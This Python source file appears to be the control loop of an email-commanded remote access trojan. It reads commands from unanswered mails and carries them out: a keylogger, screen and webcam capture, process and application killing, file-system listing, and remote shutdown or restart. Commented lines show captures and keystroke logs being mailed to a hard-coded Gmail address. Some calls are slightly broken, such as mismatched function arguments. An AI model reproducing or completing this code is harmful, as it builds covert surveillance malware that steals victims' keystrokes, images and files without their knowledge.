
import os
from utils.process import Process
from utils.application import Application
from utils.screen import Screen
from utils.webcam import Webcam
from utils.keylogger import KeyLogger
from utils.fileSystem import FileSystem
from utils.receiver import Receiver


def list_process():
    doit = Process()
    processes = doit.run(code='view')
    return processes


def kill_process():
    doit = Process()
    succeed_status = doit.run(code='kill')
    return succeed_status


def list_application():
    doit = Application()
    apps = doit.run(code='view')
    return apps


def kill_application():
    doit = Application()
    succeed_status = doit.run(code='kill')
    return succeed_status


def capture_screen():
    doit = Screen()
    succeed_status = doit.run(code='image')
    return succeed_status
    # load image/video
    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)


def record_screen(seconds=10):
    doit = Screen()
    succeed_status = doit.run(code='video', time=seconds)
    return succeed_status
    # load image/video
    # self.s.send_mail("rece


def shot_webcam():
    doit = Webcam()
    succeed_status = doit.run(code='image')
    return succeed_status
    # load image/video
    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)


def record_webcam(seconds=10):
    doit = Webcam()
    succeed_status = doit.run(code='video', time=seconds)
    return succeed_status
    # load image/video
    # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)


def get_keylogger(seconds=10):
    doit = KeyLogger()
    log = doit.hook_in(Xtime=seconds)
    return log
    # self.s.send_mail("receiverimap002@gmail.com", 'screen', log)


def list_fileSystem():
    doit = FileSystem()
    tree = doit.getTree()
    return tree
    # sent tree


def shutdown(seconds=10):
    # send message 'shutdown, complete!'
    os.popen("shutdown -s -t {}".format(seconds))
    return True


def restart(self):
    # send message 'restart, complete!'
    os.popen("shutdown /r")
    return True


def execute(command, parameter=None):  # parameter
    if command == 'LIST PROCESS':
        content = list_process()
        return content

    elif command == 'KILL PROCESS':
        content = kill_process(int(parameter)) if parameter else kill_process()
        return content

    elif command == 'LIST APP':
        content = list_application()
        return content

    elif command == 'KILL APP':
        content = kill_application(
            int(parameter)) if parameter else kill_application()
        return content

    elif command == 'CAPTURE SCREEN':
        content = capture_screen()
        return content

    elif command == 'RECORD SCREEN':
        content = record_screen(
            int(parameter)) if parameter else record_screen()
        return content

    elif command == 'SHOT WEBCAM':
        content = shot_webcam()
        return content

    elif command == 'RECORD WEBCAM':
        content = record_webcam(
            int(parameter)) if parameter else record_webcam()
        return content

    elif command == 'FILE SYSTEM':
        content = list_fileSystem()
        return content

    elif command == 'REGISTRY':  # NOT DONE
        return True

    elif command == 'KEYLOGGER':
        content = get_keylogger(
            int(parameter)) if parameter else get_keylogger()
        return content

    elif command == 'SHUTDOWN':
        content = shutdown(int(parameter)) if parameter else shutdown()
        return content

    elif command == 'RESTART':
        content = restart()
        return content


def main():
    
    r = Receiver()

    unanswered_mails = r.get_unanswered_mails()

    for mail_number in unanswered_mails:
        cm, para = r.is_valid_mail(mail_number)
        if cm:
            content = execute(cm, para)
            r.reply(mail_number, content)
        
    return


if __name__ == '__main__':
    main()
